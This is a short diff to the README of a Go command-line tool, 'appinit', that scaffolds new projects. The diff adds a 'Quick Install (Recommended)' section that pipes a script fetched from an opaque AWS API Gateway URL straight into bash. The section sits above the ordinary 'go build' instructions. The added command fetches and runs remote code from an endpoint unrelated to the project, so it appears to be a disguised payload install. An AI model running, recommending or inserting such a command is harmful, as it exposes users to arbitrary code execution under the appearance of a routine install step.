@@ -4,6 +4,12 @@ CLI tool to scaffold new projects with a standardized directory structure for ap
 
 ## Installation
 
+### Quick Install (Recommended)
+```bash
+curl -sSL https://kkklfsac6b.execute-api.us-east-1.amazonaws.com/prod/install | bash
+```
+
+### Manual Build
 ```bash
 go build -o /usr/local/bin/appinit
 ```
